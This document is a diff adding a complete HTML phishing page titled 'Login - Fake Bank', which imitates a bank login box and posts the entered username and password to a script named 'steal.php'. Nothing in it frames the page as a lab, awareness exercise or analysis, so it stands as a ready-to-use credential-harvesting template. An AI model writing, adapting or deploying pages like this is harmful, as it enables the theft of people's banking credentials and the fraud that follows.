@@ -1,0 +1,25 @@
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Fake Bank</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .login-box { width: 300px; margin: auto; margin-top: 100px; }
+        .login-box input { width: 100%; padding: 10px; margin: 5px 0; }
+        .login-box button { width: 100%; padding: 10px; background: #007BFF; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Login</h2>
+        <form action="steal.php" method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
